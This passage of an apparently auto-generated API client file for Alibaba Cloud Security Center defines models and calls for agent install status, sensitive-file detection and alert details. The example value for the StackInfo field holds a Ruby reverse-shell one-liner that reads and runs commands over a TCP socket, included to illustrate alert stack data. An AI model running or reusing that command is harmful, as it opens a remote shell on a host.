 * @param request DescribeAffectedMaliciousFileImagesRequest
 * @return DescribeAffectedMaliciousFileImagesResponse
 */
async function describeAffectedMaliciousFileImages(request: DescribeAffectedMaliciousFileImagesRequest): DescribeAffectedMaliciousFileImagesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAffectedMaliciousFileImagesWithOptions(request, runtime);
}

model DescribeAgentInstallStatusRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid value:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='59.46.XXX.XXX'),
  uuids?: string(name='Uuids', description='The UUIDs of servers. Separate multiple UUIDs with commas (,).

> You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.

This parameter is required.', example='inet-eae014a7-16c4-4d4e-9f03-5208f4dc****,inet-eae047da-1e5a-41ce-828d-47606e9b****'),
}

model DescribeAgentInstallStatusResponseBody = {
  aegisClientInvokeStatusResponseList?: [ 
    {
      message?: string(name='Message', description='The returned message.', example='Installed'),
      resuleCode?: string(name='ResuleCode', description='The installation status. Valid value:

*   **-1**: The agent is not installed.
*   **0**: The agent is installed.
*   **1**: Failed to create a directory in the client.
*   **2**: Failed to download the installation package.
*   **3**: The installation file does not exist.
*   **4**: The verification information of the installation file does not exist.
*   **5**: Failed to verify the installation file.
*   **6**: Failed to execute the installation file.
*   **7**: You do not have the required permissions. The installation failed.
*   **8**: No client process is detected.
*   **100**: The installation failed due to an unknown error.
*   **1001**: The installation failed. One-click installation is not supported in this region.
*   **1002**: The installation failed. Servers that are not provided by Alibaba Cloud are not supported. Install the agent by executing a script on the server.
*   **1003**: The installation failed. The operating system is not supported.
*   **1004**: An internal error occurred. Try again later.
*   **1005**: The Elastic Compute Service (ECS) instance is not started. Start the ECS instance and try again.
*   **1006**: One-click installation is not supported for ECS instances of the classic network type.
*   **1007**: The running command is manually stopped.
*   **1008**: Cloud Assistant is not installed. You cannot install the client.
*   **1009**: The command execution timed out. Try again later.
*   **1010**: The machine is already online. You do not need to install a client.', example='1'),
      result?: int32(name='Result', description='The installation result. Valid value:

*   **-1**: The agent is not installed.
*   **0**: The agent is being installed.
*   **1**: The agent is installed.
*   **2**: The installation failed.', example='0'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='d123f6ae-9749-4338-8c7f-3c2c1ead****'),
    }
  ](name='AegisClientInvokeStatusResponseList', description='The status of servers.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='A4EB8B1C-1DEC-5E18-BCD0-D1BBB3936FA7'),
}

model DescribeAgentInstallStatusResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeAgentInstallStatusResponseBody(name='body'),
}

/**
 * @summary Queries the installation status of the Security Center agent after you run an installation command by using Cloud Assistant. You can call this operation to query the installation status only if the installation request is initiated within 2 minutes.
 *
 * @param request DescribeAgentInstallStatusRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeAgentInstallStatusResponse
 */
async function describeAgentInstallStatusWithOptions(request: DescribeAgentInstallStatusRequest, runtime: Util.RuntimeOptions): DescribeAgentInstallStatusResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeAgentInstallStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the installation status of the Security Center agent after you run an installation command by using Cloud Assistant. You can call this operation to query the installation status only if the installation request is initiated within 2 minutes.
 *
 * @param request DescribeAgentInstallStatusRequest
 * @return DescribeAgentInstallStatusResponse
 */
async function describeAgentInstallStatus(request: DescribeAgentInstallStatusRequest): DescribeAgentInstallStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAgentInstallStatusWithOptions(request, runtime);
}

model DescribeAgentlessSensitiveFileByKeyRequest {
  currentPage?: int32(name='CurrentPage', description='The page number. Default value: **1**.', example='1'),
  imageUuid?: string(name='ImageUuid', description='The UUID of the asset that is scanned. You can query the UUID on the Host or Cloud Product page. If you scan a host, set this parameter to the UUID of the scanned host. If you scan a snapshot or a custom image, set this parameter to the ID of the scanned snapshot or image.', example='06293273b67d19516cfcc712194f****'),
  instanceId?: string(name='InstanceId', description='The instance ID of the asset that is scanned. To query the instance ID, go to the Task Management page, click Details of a task, and then view the value of Check On.', example='i-bp1fu4aqltf1huhc****'),
  pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

>  We recommend that you do not leave this parameter empty.', example='50'),
  remark?: string(name='Remark', description='The name or IP address of the asset.', example='1.2.XX.XX'),
  scanRange?: [ string ](name='ScanRange', description='The types of the assets that are scanned.'),
  sensitiveFileKey?: string(name='SensitiveFileKey', description='The type of the sensitive file.', example='sshpasswd'),
  status?: string(name='Status', description='The status of the baseline risk. Valid values:

*   **0**: unfixed.
*   **1**: fixed.', example='0'),
}

model DescribeAgentlessSensitiveFileByKeyShrinkRequest {
  currentPage?: int32(name='CurrentPage', description='The page number. Default value: **1**.', example='1'),
  imageUuid?: string(name='ImageUuid', description='The UUID of the asset that is scanned. You can query the UUID on the Host or Cloud Product page. If you scan a host, set this parameter to the UUID of the scanned host. If you scan a snapshot or a custom image, set this parameter to the ID of the scanned snapshot or image.', example='06293273b67d19516cfcc712194f****'),
  instanceId?: string(name='InstanceId', description='The instance ID of the asset that is scanned. To query the instance ID, go to the Task Management page, click Details of a task, and then view the value of Check On.', example='i-bp1fu4aqltf1huhc****'),
  pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

>  We recommend that you do not leave this parameter empty.', example='50'),
  remark?: string(name='Remark', description='The name or IP address of the asset.', example='1.2.XX.XX'),
  scanRangeShrink?: string(name='ScanRange', description='The types of the assets that are scanned.'),
  sensitiveFileKey?: string(name='SensitiveFileKey', description='The type of the sensitive file.', example='sshpasswd'),
  status?: string(name='Status', description='The status of the baseline risk. Valid values:

*   **0**: unfixed.
*   **1**: fixed.', example='0'),
}

model DescribeAgentlessSensitiveFileByKeyResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='20'),
    currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='100'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The request ID.', example='FBBEB173-1F43-505F-A876-C03ECDF6CE4C'),
  sensitiveFileList?: [ 
    {
      filePath?: string(name='FilePath', description='The path to the sensitive file.', example='/usr/lib/abc.txt'),
      firstScanTime?: long(name='FirstScanTime', description='The timestamp when the first scan was performed. Unit: milliseconds.', example='1663321552000'),
      id?: long(name='Id', description='The ID of the alert for the sensitive file.', example='423505573'),
      instanceName?: string(name='InstanceName', description='The instance name of the asset.', example='test-server'),
      internetIp?: string(name='InternetIp', description='The public IP address of the asset.', example='95.214.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the asset.', example='10.68.XX.XX'),
      lastScanTime?: long(name='LastScanTime', description='The timestamp when the last scan was performed. Unit: milliseconds.', example='1663691592000'),
      md5?: string(name='Md5', description='The MD5 hash value of the sensitive file.', example='b484b0dff093f358897486b58266****'),
      prompt?: string(name='Prompt', description='The content of the sensitive file.', example='mysql -u -p****'),
      riskLevel?: string(name='RiskLevel', description='The risk level. Valid values:

*   **high**
*   **medium**
*   **low**', example='high'),
      sensitiveFileKey?: string(name='SensitiveFileKey', description='The type of the sensitive file.', example='pem'),
      status?: int32(name='Status', description='The status of the sensitive file. Valid values:

*   **0**: unhandled.
*   **1**: ignored.
*   **2**: false positive.', example='0'),
      targetName?: string(name='TargetName', description='The name of the asset.', example='SAS_Agentless_171869952****'),
      uuid?: string(name='Uuid', description='The UUID of the asset.', example='73e6a851-e63b-49ef-9d7a-5542d765****'),
    }
  ](name='SensitiveFileList', description='The information about the sensitive files that are detected by using the agentless detection feature.'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model DescribeAgentlessSensitiveFileByKeyResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeAgentlessSensitiveFileByKeyResponseBody(name='body'),
}

/**
 * @summary Queries the list of assets on which a specific type of sensitive files are detected by using the agentless detection feature.
 *
 * @description You can call this operation only when the agentless detection feature is purchased by using the pay-as-you-go billing method within your Alibaba Cloud account.
 *
 * @param tmpReq DescribeAgentlessSensitiveFileByKeyRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeAgentlessSensitiveFileByKeyResponse
 */
async function describeAgentlessSensitiveFileByKeyWithOptions(tmpReq: DescribeAgentlessSensitiveFileByKeyRequest, runtime: Util.RuntimeOptions): DescribeAgentlessSensitiveFileByKeyResponse {
  Util.validateModel(tmpReq);
  var request = new DescribeAgentlessSensitiveFileByKeyShrinkRequest{};
  OpenApiUtil.convert(tmpReq, request);
  if (!Util.isUnset(tmpReq.scanRange)) {
    request.scanRangeShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.scanRange, 'ScanRange', 'json');
  }
  var query = OpenApiUtil.query(Util.toMap(request));
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeAgentlessSensitiveFileByKey',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'GET',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the list of assets on which a specific type of sensitive files are detected by using the agentless detection feature.
 *
 * @description You can call this operation only when the agentless detection feature is purchased by using the pay-as-you-go billing method within your Alibaba Cloud account.
 *
 * @param request DescribeAgentlessSensitiveFileByKeyRequest
 * @return DescribeAgentlessSensitiveFileByKeyResponse
 */
async function describeAgentlessSensitiveFileByKey(request: DescribeAgentlessSensitiveFileByKeyRequest): DescribeAgentlessSensitiveFileByKeyResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAgentlessSensitiveFileByKeyWithOptions(request, runtime);
}

model DescribeAlarmEventDetailRequest {
  alarmUniqueInfo?: string(name='AlarmUniqueInfo', description='The unique identifier of the alert event.

> To query the details of an alert event, you must provide the unique identifier of the alert event. You can call the [DescribeSuspEvents](~~DescribeSuspEvents~~) operation to obtain the identifier.

This parameter is required.', example='9f62555666f177aa84ee1eaf465a****'),
  from?: string(name='From', description='The ID of the request source. Set the value to **sas**.

This parameter is required.', example='sas'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.168.XX.XX'),
}

model DescribeAlarmEventDetailResponseBody = {
  data?: {
    alarmEventAliasName?: string(name='AlarmEventAliasName', description='The name of the alert event.', example='Login with unusual location'),
    alarmEventDesc?: string(name='AlarmEventDesc', description='The description of the alert event.', example='The detection model finds that self-mutation is running on your server. A self-mutation Trojan is a Trojan horse program with self-mutation function. It will change its hash or copy a large number of itself to different paths, and run in the background to avoid cleaning.'),
    alarmUniqueInfo?: string(name='AlarmUniqueInfo', description='The unique identifier of the alert event.

> To query the details of an alert event, you must provide the unique identifier of the alert event. You can call the [DescribeSuspEvents](~~DescribeSuspEvents~~) operation to obtain the identifier.', example='9f62555666f177aa84ee1eaf465a****'),
    appName?: string(name='AppName', description='The name of the container application.', example='app:msdp-uat-service'),
    canBeDealOnLine?: boolean(name='CanBeDealOnLine', description='Indicates whether the online handling of the alert event is supported. Valid values:

*   **true**: yes
*   **false**: no', example='false'),
    canCancelFault?: boolean(name='CanCancelFault', description='Indicates whether you can cancel marking the alert event as a false positive. Valid values:

*   **true**: yes
*   **false**: no', example='false'),
    causeDetails?: [ 
      {
        key?: string(name='Key', description='The key that is used to trace the alert event.', example='842e314e69b1a2c45d5c1a2f88a16***'),
        value?: [ 
          {
            name?: string(name='Name', description='The name of the field that displays the tracing information.', example='sshd'),
            type?: string(name='Type', description='The type of the field that displays the tracing information. Valid values:

*   **text**
*   **html**', example='html'),
            value?: string(name='Value', description='The value of the field that displays the tracing information.', example='<p>under a certain small probability, yundun may mistakenly judge the repeated attempts caused by the administrator forgetting or entering the wrong password as successful blasting. Please check according to the account number and time shown in the alarm details. Once it is confirmed that it is not the initiative of the administrator, it is recommended to immediately block the IP, and you can open it at the same time<a href="https://yundun.console.aliyun.com/?p=pam">PAM</a>, hosting host login password, improving remote connection efficiency and security control ability, and according to<a href="https://click.aliyun.com/m/1000226086/">best practice of ECS account security protection</a>Modify login password and convergence asset.</p>↵'),
          }
        ](name='Value', description='The value that is used to trace the alert event.'),
      }
    ](name='CauseDetails', description='An array consisting of the cause of the alert event, which can be used to trace the alert event.'),
    containHwMode?: boolean(name='ContainHwMode', description='Indicates whether the Safeguard Mode For Major Activities mode is enabled.', example='true'),
    containerId?: string(name='ContainerId', description='The ID of the container application.', example='container_1606995441910_394868_01_000***'),
    containerImageId?: string(name='ContainerImageId', description='The ID of the image to which the container belongs.', example='cadb7a725641'),
    containerImageName?: string(name='ContainerImageName', description='The name of the image to which the container belongs.', example='jenkins/jenkins:latest'),
    dataSource?: string(name='DataSource', description='The data source of the alert event.', example='aegis_***'),
    endTime?: long(name='EndTime', description='The timestamp when the alert event ends. Unit: milliseconds.', example='1542366542000'),
    instanceName?: string(name='InstanceName', description='The name of the instance.', example='i-wz92q7m5hsbgfhdss***'),
    internetIp?: string(name='InternetIp', description='The public IP address of the associated instance.', example='172.16.XX.XX'),
    intranetIp?: string(name='IntranetIp', description='The private IP address of the associated instance.', example='172.25.30.**'),
    k8sClusterId?: string(name='K8sClusterId', description='The ID of the Kubernetes cluster.', example='c562cf0d68e9749ee9fe544a7ab2f****'),
    k8sClusterName?: string(name='K8sClusterName', description='The name of the Kubernetes cluster.', example='TestK8sCluser'),
    k8sNamespace?: string(name='K8sNamespace', description='The namespace of the Kubernetes cluster.', example='sit-saic-trip'),
    k8sNodeId?: string(name='K8sNodeId', description='The ID of the Kubernetes cluster node.', example='i-bp14a1ay8e0aa9t0l***'),
    k8sNodeName?: string(name='K8sNodeName', description='The name of the Kubernetes cluster node.', example='cn-hangzhou.10.188.139.**'),
    k8sPodName?: string(name='K8sPodName', description='The name of the Kubernetes pod.', example='myapp-pod'),
    level?: string(name='Level', description='The severity of the alert event. Valid values:

*   **serious**
*   **suspicious**
*   **remind**', example='serious'),
    solution?: string(name='Solution', description='The solution to the alert event.', example='An invalid logon source IP has been detected. If you recognize this logon attempt, we recommend that you add the current logon source IP to the valid logon source IP list to avoid future alerts. If you do not recognize this logon attempt, we recommend that you modify the password.'),
    startTime?: long(name='StartTime', description='The timestamp when the alert event starts. Unit: milliseconds.', example='1542378601000'),
    type?: string(name='Type', description='The alert type of the alert event. Valid values:

*   Suspicious process
*   Webshell
*   Unusual logon
*   Exception
*   Sensitive file tampering
*   Malicious process (cloud threat detection)
*   Suspicious network connection
*   Other
*   Abnormal account
*   Application intrusion event
*   Cloud threat detection
*   Precise defense
*   Application whitelist
*   Persistent webshell
*   Web application threat detection
*   Malicious script
*   Threat intelligence
*   Malicious network activity
*   Cluster exception
*   Webshell (on-premises threat detection)
*   Vulnerability exploitation
*   Malicious process (on-premises threat detection)
*   Trusted exception', example='Webshell'),
    uuid?: string(name='Uuid', description='The instance UUID of the asset.', example='6690a46c-0edb-4663-a641-3629d1a9****'),
  }(name='Data', description='The details of the alert event.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7EA50837-2F0B-5BCC-AB61-4968D88D75AD'),
}

model DescribeAlarmEventDetailResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeAlarmEventDetailResponseBody(name='body'),
}

/**
 * @summary Queries the details of an alert event. An alert event consists of alerts and exceptions. Each alert event is associated with multiple exceptions.
 *
 * @param request DescribeAlarmEventDetailRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeAlarmEventDetailResponse
 */
async function describeAlarmEventDetailWithOptions(request: DescribeAlarmEventDetailRequest, runtime: Util.RuntimeOptions): DescribeAlarmEventDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.alarmUniqueInfo)) {
    query['AlarmUniqueInfo'] = request.alarmUniqueInfo;
  }
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeAlarmEventDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the details of an alert event. An alert event consists of alerts and exceptions. Each alert event is associated with multiple exceptions.
 *
 * @param request DescribeAlarmEventDetailRequest
 * @return DescribeAlarmEventDetailResponse
 */
async function describeAlarmEventDetail(request: DescribeAlarmEventDetailRequest): DescribeAlarmEventDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAlarmEventDetailWithOptions(request, runtime);
}

model DescribeAlarmEventStackInfoRequest {
  eventName?: string(name='EventName', description='The name of the event.

>  You can call the [DescribeSuspEvents](~~DescribeSuspEvents~~) operation to query the names of events.

This parameter is required.', example='Mining program'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese.
*   **en**: English.', example='zh'),
  resourceDirectoryAccountId?: long(name='ResourceDirectoryAccountId', description='The Alibaba Cloud account ID of the member in the resource directory.

>  You can call the [DescribeMonitorAccounts](~~DescribeMonitorAccounts~~) operation to obtain the IDs.', example='127608589417****'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.168.XX.XX'),
  uniqueInfo?: string(name='UniqueInfo', description='The ID of the alert event.

This parameter is required.', example='1fbe8d16727f61d1478a674d6fa0****'),
  uuid?: string(name='Uuid', description='The UUID of the server to query.

>  You can call the [DescribeSuspEvents](~~DescribeSuspEvents~~) operation to query the UUIDs of servers.

This parameter is required.', example='18b7336e-d469-473b-af83-8e5420f9****'),
}

model DescribeAlarmEventStackInfoResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='ECC6B3E3-D496-512D-B46D-E6996A6B63EE'),
  stackInfo?: string(name='StackInfo', description='The stack information of the alert details.', example='[ { "child": [ { "child": [ { "child": [ ], "data": { "cmdline": "id", "proc_path": "/bin/id", "pid": "[3033]" }, "description": { "extend": [ ], "main": { "content": "${pid} ${cmdline}", "content_type": "markdown" } } }, { "child": [ ], "data": { "cmdline": "whoami", "proc_path": "/bin/whoami", "pid": "[3035]" }, "description": { "extend": [ ], "main": { "content": "${pid} ${cmdline}", "content_type": "markdown" } } } ], "data": { "cmdline": "/bin/bash -c \\\\"id && whoami\\\\"", "proc_path": "/bin/bash", "pid": "[3022]" }, "description": { "extend": [ ], "main": { "content": "${pid} ${cmdline}", "content_type": "markdown" } } } ], "data": { "src_ip": "0.0.0.0", "cmdline": "ruby -rsocket -e exit if fork;c=TCPSocket.new(\\\\\\\\"0.0.0.0\\\\\\\\",\\\\\\\\"1111\\\\\\\\");while(cmd=c.gets);IO.popen(cmd,\\\\\\\\"r\\\\\\\\"){|io|c.print io.read}end", "file": "ruby", "login_port": "22", "login_type": "Password", "proc_path": "/usr/bin/ruby", "dst_port": "1111", "pid": "3011", "user": "root", "dst_ip": "0.0.0.0", "log_time": "2020-01-20 09:00:00" }, "description": { "extend": [ { "content": "${tpl_netstat}", "content_type": "text" } ], "main": { "content": "${pid} ${cmdline}", "content_type": "markdown" } } } ]'),
}

model DescribeAlarmEventStackInfoResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeAlarmEventStackInfoResponseBody(name='body'),
}

/**
 * @summary Queries the stack information about an alert event.
 *
 * @param request DescribeAlarmEventStackInfoRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeAlarmEventStackInfoResponse
 */
async function describeAlarmEventStackInfoWithOptions(request: DescribeAlarmEventStackInfoRequest, runtime: Util.RuntimeOptions): DescribeAlarmEventStackInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.eventName)) {
    query['EventName'] = request.eventName;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.resourceDirectoryAccountId)) {
    query['ResourceDirectoryAccountId'] = request.resourceDirectoryAccountId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uniqueInfo)) {
    query['UniqueInfo'] = request.uniqueInfo;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeAlarmEventStackInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the stack information about an alert event.
 *
 * @param request DescribeAlarmEventStackInfoRequest
 * @return DescribeAlarmEventStackInfoResponse
 */
async function describeAlarmEventStackInfo(request: DescribeAlarmEventStackInfoRequest): DescribeAlarmEventStackInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAlarmEventStackInfoWithOptions(request, runtime);
}

model DescribeAllEntityResponseBody = {
  entityList?: [ 
    {
      groupId?: int32(name='GroupId', description='The ID of the asset group.', example='281801'),
      instanceName?: string(name='InstanceName', description='The name of the server.', example='abc'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='172.19.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='100.104.XX.XX'),
      ip?: string(name='Ip', description='The IP address of the server.', example='101.132.XX.XX'),
      os?: string(name='Os', description='The operating system of the server. Valid values:

*   **linux**
*   **windows**', example='windows'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='4fe8e1cd-3c37-4851-b9de-124da32c****'),
    }
  ](name='EntityList', description='An array that consists of servers.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model DescribeAllEntityResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeAllEntityResponseBody(name='body'),
}

/**
 * @summary Queries the information about all server assets, including the asset group IDs and asset names.
 *
 * @param request DescribeAllEntityRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeAllEntityResponse
 */
async function describeAllEntityWithOptions(runtime: Util.RuntimeOptions): DescribeAllEntityResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeAllEntity',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the information about all server assets, including the asset group IDs and asset names.
 *
 * @return DescribeAllEntityResponse
 */
async function describeAllEntity(): DescribeAllEntityResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAllEntityWithOptions(runtime);
}

model DescribeAllGroupsRequest {
  lang?: string(name='Lang', description='The natural language of the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
}

model DescribeAllGroupsResponseBody = {
  count?: int32(name='Count', description='The total number of server groups.', example='2'),
  groups?: [ 
    {
      groupFlag?: int32(name='GroupFlag', description='The type of the server group. Valid values:

*   **0**: default group
*   **1**: other groups', example='1'),
      groupId?: int32(name='GroupId', description='The ID of the server group.', example='8834224'),
      groupName?: string(name='GroupName', description='The name of the server group.', example='abc'),
    }
  ](name='Groups', description='The grouping information about the servers.'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model DescribeAllGroupsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeAllGroupsResponseBody(name='body'),
}

/**
 * @summary Queries the information about all server groups.
 *
 * @param request DescribeAllGroupsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeAllGroupsResponse
 */
async function describeAllGroupsWithOptions(request: DescribeAllGroupsRequest, runtime: Util.RuntimeOptions): DescribeAllGroupsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeAllGroups',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the information about all server groups.
 *
 * @param request DescribeAllGroupsRequest
 * @return DescribeAllGroupsResponse
 */
async function describeAllGroups(request: DescribeAllGroupsRequest): DescribeAllGroupsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAllGroupsWithOptions(request, runtime);
}

model DescribeAllImageBaselineRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
}

model DescribeAllImageBaselineResponseBody = {
  imageBaselines?: {
    baselineClassList?: [ 
      {
        alias?: string(name='Alias', description='The alias of the baseline type.', example='Identity authentication'),
        baselineNameList?: [ 
          {
            alias?: string(name='Alias', description='The alias of the baseline.', example='Identity authentication'),
            baselineItemList?: [ 
              {
                alias?: string(name='Alias', description='The alias of the baseline check item.', example='Ensure that no accounts use the same Hash password.'),
                classKey?: string(name='ClassKey', description='The key of the type for the baseline.', example='identification'),
                itemKey?: string(name='ItemKey', description='The key of the name for the baseline check item.', example='duplicate_pwd_hash'),
                nameKey?: string(name='NameKey', description='The key of the name for the baseline.', example='identification'),
              }
            ](name='BaselineItemList', description='The information about the baseline check item.'),
            classKey?: string(name='ClassKey', description='The key of the type for the baseline.', example='identification'),
            nameKey?: string(name='NameKey', description='The key of the name for the baseline.', example='identification'),
          }
        ](name='BaselineNameList', description='The information about the baseline.'),
        classKey?: string(name='ClassKey', description='The key of the baseline type.', example='identification'),
      }
    ](name='BaselineClassList', description='An array that consists of baseline types.'),
  }(name='ImageBaselines', description='The baselines that are used in image baseline checks.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to query logs and troubleshoot issues.', example='1A975D03-5F49-5354-B2CB-3918D5DA****'),
}

model DescribeAllImageBaselineResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeAllImageBaselineResponseBody(name='body'),
}

/**
 * @summary Queries baselines that are used in image baseline checks.
 *
 * @param request DescribeAllImageBaselineRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeAllImageBaselineResponse
 */
async function describeAllImageBaselineWithOptions(request: DescribeAllImageBaselineRequest, runtime: Util.RuntimeOptions): DescribeAllImageBaselineResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeAllImageBaseline',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries baselines that are used in image baseline checks.
 *
 * @param request DescribeAllImageBaselineRequest
 * @return DescribeAllImageBaselineResponse
 */
